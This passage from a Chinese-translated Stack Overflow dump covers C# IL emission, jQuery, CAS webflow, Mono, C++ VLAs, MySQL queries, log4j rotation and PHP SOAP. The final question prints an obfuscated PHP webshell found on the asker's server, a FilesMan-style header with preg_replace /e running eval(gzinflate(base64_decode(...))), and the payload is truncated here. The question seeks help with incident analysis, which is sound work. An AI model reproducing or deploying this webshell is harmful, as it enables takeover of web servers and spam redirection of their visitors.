       ILGenerator ctorIL = pointCtor.GetILGenerator();

       // First, you build the constructor.
       ctorIL.Emit(OpCodes.Ldarg_0);
       ctorIL.Emit(OpCodes.Call, objCtor);
       ctorIL.Emit(OpCodes.Ldarg_0);
       ctorIL.Emit(OpCodes.Ldarg_1);
       ctorIL.Emit(OpCodes.Stfld, xField); 
       ctorIL.Emit(OpCodes.Ldarg_0);
       ctorIL.Emit(OpCodes.Ldarg_2);
       ctorIL.Emit(OpCodes.Stfld, yField); 
       ctorIL.Emit(OpCodes.Ret); 

       //  Now, you'll build a method to output some information on the
       // inside your dynamic class. This method will have the following
       // definition in C#:
    //  public void WritePoint()

       MethodBuilder writeStrMthd = pointTypeBld.DefineMethod(
                                     "WritePoint", 
                             MethodAttributes.Public,
                                             typeof(void), 
                                             null);

       ILGenerator writeStrIL = writeStrMthd.GetILGenerator();

       // The below ILGenerator created demonstrates a few ways to create
       // string output through STDIN. 

       // ILGenerator.EmitWriteLine(string) will generate a ldstr and a 
       // call to WriteLine for you.

       writeStrIL.EmitWriteLine("The value of this current instance is:");

       // Here, you will do the hard work yourself. First, you need to create
       // the string we will be passing and obtain the correct WriteLine overload
       // for said string. In the below case, you are substituting in two values,
       // so the chosen overload is Console.WriteLine(string, object, object).

       String inStr = "({0}, {1})";
       Type[] wlParams = new Type[] {typeof(string),
                     typeof(object),
                     typeof(object)};

       // We need the MethodInfo to pass into EmitCall later.

       MethodInfo writeLineMI = typeof(Console).GetMethod(
                            "WriteLine",
                        wlParams);

       // Push the string with the substitutions onto the stack.
       // This is the first argument for WriteLine - the string one. 

       writeStrIL.Emit(OpCodes.Ldstr, inStr);

       // Since the second argument is an object, and it corresponds to
       // to the substitution for the value of our integer field, you 
       // need to box that field to an object. First, push a reference
       // to the current instance, and then push the value stored in
       // field 'x'. We need the reference to the current instance (stored
       // in local argument index 0) so Ldfld can load from the correct
       // instance (this one).

       writeStrIL.Emit(OpCodes.Ldarg_0);
       writeStrIL.Emit(OpCodes.Ldfld, xField);

       // Now, we execute the box opcode, which pops the value of field 'x',
       // returning a reference to the integer value boxed as an object.

       writeStrIL.Emit(OpCodes.Box, typeof(int));

       // Atop the stack, you'll find our string inStr, followed by a reference
       // to the boxed value of 'x'. Now, you need to likewise box field 'y'.

       writeStrIL.Emit(OpCodes.Ldarg_0);
       writeStrIL.Emit(OpCodes.Ldfld, yField);
       writeStrIL.Emit(OpCodes.Box, typeof(int));

       // Now, you have all of the arguments for your call to
       // Console.WriteLine(string, object, object) atop the stack:
       // the string InStr, a reference to the boxed value of 'x', and
       // a reference to the boxed value of 'y'.

       // Call Console.WriteLine(string, object, object) with EmitCall.

       writeStrIL.EmitCall(OpCodes.Call, writeLineMI, null);

       // Lastly, EmitWriteLine can also output the value of a field
       // using the overload EmitWriteLine(FieldInfo).

       writeStrIL.EmitWriteLine("The value of 'x' is:");
       writeStrIL.EmitWriteLine(xField);
       writeStrIL.EmitWriteLine("The value of 'y' is:");
       writeStrIL.EmitWriteLine(yField);

       // Since we return no value (void), the the ret opcode will not
       // return the top stack value.

       writeStrIL.Emit(OpCodes.Ret);

       return pointTypeBld.CreateType();

   }

   public static void Main() {

      object[] ctorParams = new object[2];

      Console.Write("Enter a integer value for X: "); 
      string myX = Console.ReadLine();
      Console.Write("Enter a integer value for Y: "); 
      string myY = Console.ReadLine();

      Console.WriteLine("---");

      ctorParams[0] = Convert.ToInt32(myX);
      ctorParams[1] = Convert.ToInt32(myY);

      Type ptType = CreateDynamicType();

      object ptInstance = Activator.CreateInstance(ptType, ctorParams);
      ptType.InvokeMember("WritePoint",
              BindingFlags.InvokeMethod,
              null,
              ptInstance,
              new object[0]);
   }
} 
```

# jquery - jquery - 从具有相同 id 的多个下拉列表中获取值

> ID：13524435
> 
> 赞同：1
> 
> 时间：2012-11-23T07:01:32.057
> 
> 标签：jquery, arrays

我有这些带有动态 id 和值的动态下拉列表。

```
<select id=extra['123']></select>
<select id=extra['453']></select>
<select id=extra['789']></select> 
```

在 php 中，我可以使用以下方法获取值：

```
$_REQUEST['extra'] 
```

我得到一个数组。

```
[extra] => Array
    (
        [123] => 0
        [453] => 0
        [789] => 0
    ) 
```

但是如何在 jquery 中创建一个数组呢？提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:03:27.303

您可以使用通配符

**[现场演示](http://jsfiddle.net/Qp64H/)**

```
selectArray = $('[id^=extra]'); 
```

遍历所有选择

```
selectArray.each(function() {
    alert(this.id);
})​ 
```

用于获取选择的 id 中的数字

**[现场演示](http://jsfiddle.net/Qp64H/1/)**

```
selectArray = $('[id^=extra]');
ids = selectArray.map(function() {
    return this.id.replace("extra['", "").replace("']", "");
}).get().join();
alert(ids);
​ 
```

# spring-webflow - 使用 jasing cas 单点登录中的链接从 casGenericSuccess 页面转到下一页

> ID：13524440
> 
> 赞同：0
> 
> 时间：2012-11-23T07:02:13.637
> 
> 标签：spring-webflow, single-sign-on, cas, spring-webflow-2, jasig

我想从 casGenericSuccess.jsp 导航到我添加的 jsp 页面，但我无法使用超链接转到下一页。

我所做的是：

login-webflow.xml 中的更改

```
 <view-state id="viewGenericLoginSuccess" view="casLoginGenericSuccessView">
            <transition on="userManagement" to="userManagementHome" />
    </view-state> 
```

default_views.properties

```
userManagementHome.(class)=org.springframework.web.servlet.view.JstlView 
userManagementHome.url=/WEB-INF/view/jsp/default/ui/userManagementHome.jsp 
```

casGenericSuccessView.jsp

```
<jsp:directive.include file="includes/top.jsp" />
                <div id="msg" class="success">

<spring:message code="screen.success.header" />
                        <p><spring:message code="screen.success.success" /></p>
                        <p><spring:message code="screen.success.security" /></p>

                        <a href="login?_flowExecutionKey=${flowExecutionKey}&_eventId=userManagement">User   Management

                </div>
<jsp:directive.include file="includes/bottom.jsp" /> 
```

我也尝试将 href 更改为 login?&_eventId=userManagement

我的 userManagementHome.jsp 位于 casGenericSuccess.jsp 所在的同一位置。

有人可以帮我导航到我的页面。

现在它没有导航并在单击用户管理链接时显示相同的 casGenericSuccess.jsp 页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T09:14:29.257

尝试使用`execution`而不是`_flowExecutionKey`

# c# - Mono Android 跨平台应用

> ID：13524443
> 
> 赞同：1
> 
> 时间：2012-11-23T07:02:38.700
> 
> 标签：c#, android, xamarin.android, monodevelop

我是 Mono 的新手，目前正在为 Android 开发 Mono。我想重用核心层或服务层，所以我为服务层创建了一个单独的项目，以便以后可以将它用于 iPhone 和 Windows 移动应用程序。在服务项目中，有一些对调用各种事务的 Web 服务的引用。

当我尝试通过引用来自 Mono Android 应用程序的服务项目来调用 Web 服务时，我恢复了“System.TypeLoadException：无法加载类型 xxxx”异常。

使用简单的 Windows 应用程序进行尝试时，Web 服务和服务项目运行良好。

有什么办法可以做到这一点。

我尝试链接以下文章中提到的类。

[http://docs.xamarin.com/Android/Guides/Application_Fundamentals/Building_Cross_Platform_Applications/Sharing_Code_Options](http://docs.xamarin.com/Android/Guides/Application_Fundamentals/Building_Cross_Platform_Applications/Sharing_Code_Options)

位我发现当您链接一个类时，引用的 Web 服务和资源文件引用等并没有引用。例如，如果我从项目 A 链接项目 B 中的一个类，如果该类具有 Web 服务调用和引用的资源文件，一旦您链接到项目 A，您将得到构建错误。说找不到网络服务和资源文件。我也链接了资源文件。但我仍然恢复了同样的错误。

对这些问题的任何帮助都非常适合。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T11:16:04.297

如果您精通法语......那么[http://www.e-naxos.com/Blog/post/Strategie-de-developpement-Cross-Platform-Partie-2.aspx](http://www.e-naxos.com/Blog/post/Strategie-de-developpement-Cross-Platform-Partie-2.aspx)上的示例（和[http:// /www.e-naxos.com/Blog/post/Strategie-de-developpement-Cross-Platform-Partie-3.aspx](http://www.e-naxos.com/Blog/post/Strategie-de-developpement-Cross-Platform-Partie-3.aspx)）有一些关于在 windows、windowsphone 和 monodroid 之间共享 Web 服务引用的好信息

作者所做的关键事情是分别为两个不同的平台导入 Web 引用 - 然后使用一个`#if`来分隔不同的代码。

我确实开始翻译它...... [https://docs.google.com/document/d/1UQsy80qmXkVO7BRUb3f3vUxO2uQz9af1_PIQykAGzJA/edit](https://docs.google.com/document/d/1UQsy80qmXkVO7BRUb3f3vUxO2uQz9af1_PIQykAGzJA/edit) - 但我害怕鸽子英语充其量！

# c++ - 清除或清空 VLA

> ID：13524444
> 
> 赞同：-1
> 
> 时间：2012-11-23T07:02:44.547
> 
> 标签：c++, class, null

我有一个类成员作为 VLA 引用一些其他对象（即包含指向其他对象的指针）。我想在完成 VLA 内容后清空它。将其长度设置为零是否足够，或者我需要在此之前将其各个元素设置为 NULL 还是我需要两者都做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:13:45.373

**在使用缩写VLA**（如 C99 中）所指示的意义上，C++ 没有可变长度数组。

因此，虽然您关于如何处理代码中的特定 VLA 的问题可能对某些特定的 C++*语言扩展*有意义，但它对标准 C++ 没有意义。

一些源代码、有关 C++ 语言扩展的信息，或者简而言之，*对问题的一些具体描述*，可能有助于提供更面向问题的答案，而不仅仅是纠正一些误解。

* * *

一个合理的猜测是，使用 a`std::vector`而不是你正在使用的任何东西，你会得到很好的服务。

但是，您的问题实际上与某些 C++ 语言扩展中的 VLA 有关，这也是一个合理的猜测，在这种情况下，使用建议`std::vector`很可能是不好的。

没有信息可以决定好的建议。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:15:41.483

*注意：VLA 是 C99 标准的一部分，即使 gcc 允许它们，它们也不是 C++ 的一部分。*

话虽如此，一旦创建了数组，您就无法*清除它*。数组的空间（无论是常规数组还是 VLA）被保留到块结束（在函数中）或直到程序结束（在命名空间级别）。

如果您希望使用*可调整大小*的数组，则应该使用*动态数组*：事实证明标准库提供`std::vector`了这种用法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:13:13.000

使用[`std::vector`](http://en.cppreference.com/w/cpp/container/vector)，然后执行[`my_vector.clear();`](http://en.cppreference.com/w/cpp/container/vector/clear)。

# php - 在mysql查询ORDER BY中更改时间格式

> ID：13524447
> 
> 赞同：1
> 
> 时间：2012-11-23T07:02:57.420
> 
> 标签：php, mysql, sql

我正在开发一个项目，其中用户有数据库，其日期以正常格式**2013 年 3 月 8**日存储，我想用日期对输出进行排序..但没有得到正确的输出 bcos 时间戳未使用....所以我可以使用或将该日期字段转换为mysql查询中的时间戳

```
SELECT * FROM imdb WHERE year ='2012' ORDER BY `date` DESC LIMIT 20 
```

我想要这样的东西

```
SELECT * FROM imdb WHERE year ='2012' ORDER BY strtotime(`date`) DESC LIMIT 20 
```

但我知道这行不通……有出路吗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:08:22.623

由于它不是日期，因此用于`STR_TO_DATE`将字符串转换为日期

```
SELECT * 
FROM imdb 
WHERE year ='2012' 
ORDER BY STR_TO_DATE(`date`, '%e %M %Y') DESC 
LIMIT 20 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/67fca/4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:06:18.983

试试这个：：

```
SELECT * FROM imdb WHERE year ='2012' ORDER BY DATE(`date`) DESC LIMIT 20 
```

# java - 使用 log4j 归档以前的日志文件

> ID：13524460
> 
> 赞同：1
> 
> 时间：2012-11-23T07:03:31.813
> 
> 标签：java, logging, log4j

我目前正在使用`rollingFileAppender`和滚动基于时间的文件。

我想根据日期滚动日志文件，以便我每天有一个日志文件。（我假设这可以使用`dailyRollingFileAppender`.）

此外，我想存档以前的日志文件，以便我有 15 天的未压缩日志文件和另外 15 天的存档格式，以便一个压缩文件包含 15 天的日志文件。

我可以`log4j.properties`单独使用吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:39:48.757

为此，您可以使用 crontab 并安排它来归档或压缩日志文件。

你可以在你的 crontab 文件中做这样的事情——

```
0 0 15 * * find /your-folder -name '*trace.log' -mtime -15 | xargs gzip -v9 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:08:50.893

一个外部选项是“logrotated”，它有做你需要的规则。示例 conf 文件可以在 /etc/logrotate.d/* 中。例如：

```
cat /etc/logrotate.d/dpkg    
/var/log/dpkg.log {
    monthly
    rotate 12
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}
/var/log/alternatives.log {
    monthly
    rotate 12
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
} 
```

# php - 从 .NET 访问 php Soap 服务

> ID：13524462
> 
> 赞同：1
> 
> 时间：2012-11-23T07:03:44.520
> 
> 标签：php, .net, web-services, soap

我已经创建了 php soap web 服务。由于我在谷歌的帮助下对 php 不熟悉，因此以下代码显示了肥皂服务器。

```
ini_set("soap.wsdl_cache_enabled", "0");
$server = new SoapServer("http://localhost/api/soap/report.wsdl");
$server->addFunction("testServer");
$server->handle(); 
```

我可以使用 php soap 客户端访问此服务并且工作正常。下面的代码显示了 php soap 客户端。

```
 $client = new SoapClient("http://localhost/api/soap/report.wsdl", array('soap_version' => SOAP_1_2,'trace' => 1 ));
   $return = $client->__soapCall("testServer",array());
   print_r($return); 
```

但是当我尝试使用 .NET 访问上述 php soap web 服务时无法访问。我能够将服务引用添加到 .NET 项目，但无法实例化服务。

请帮忙。

# mysql - 如何仅使用“group_concat”过滤表 mysql 中的行

> ID：13524463
> 
> 赞同：0
> 
> 时间：2012-11-23T07:03:55.130
> 
> 标签：mysql, codeigniter, group-concat

它有一列`IsDisabled` 我只想用于`group_concat`行`IsDisabled=0`

目前我正在使用

```
select parentid,group_concat(REPLACE(WhatDoYouSell, ',', '')) sales from table_name
group by parentid 
```

`WhatDoYouSell`如果只有`IsDisabled=0`该行，我想使用 group_concat列

我试过

```
select parentid,group_concat(REPLACE(WhatDoYouSell, ',', '')) sales from table_name
where IsDisabled=0 
group by parentid 
```

似乎该查询忽略了所有`group by parentid records`如果其中一个recoeds`IsDisabled =1`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:22:22.570

使用内部条件尝试此查询 -

```
CREATE TABLE table_name(
  parentid INT(11) DEFAULT NULL,
  WhatDoYouSell INT(11) DEFAULT NULL,
  IsDisabled INT(11) DEFAULT NULL
);
INSERT INTO table_name(parentid, WhatDoYouSell, IsDisabled) VALUES
(1, 1, 0),
(1, 2, 1),
(1, 3, 0),
(2, 1, 1),
(2, 2, 1);

SELECT
  parentid,
  GROUP_CONCAT(IF(IsDisabled = 0, WhatDoYouSell, NULL)) sales
FROM
  table_name
GROUP BY
  parentid;

+----------+-------+
| parentid | sales |
+----------+-------+
|        1 | 1,3   |
|        2 | NULL  |
+----------+-------+ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:15:03.423

尝试这个：

```
SELECT parentid,GROUP_CONCAT(REPLACE(WhatDoYouSell, ',', '')) sales
FROM (SELECT parentid, WhatDoYouSell FROM  table_name 
WHERE IsDisabled=0 ) AS A
GROUP BY parentid 
```

# php - 无法解码在我的服务器上植入的 php“病毒”

> ID：13524470
> 
> 赞同：4
> 
> 时间：2012-11-23T07:04:45.643
> 
> 标签：php, virus

我需要帮助解码以下代码。我自己不确定从哪里开始。一些背景知识：它来自 public_html 根目录中名为 50ae7fd5b7461.php 的文件。效果是修改帐户中的所有 htaccess 文件，以将移动用户重定向到 crzyluxtds.in 域上的垃圾邮件站点。我希望解码此文件将有助于提供有关系统如何受到损害的线索。下面的代码：

```
$auth_pass = "";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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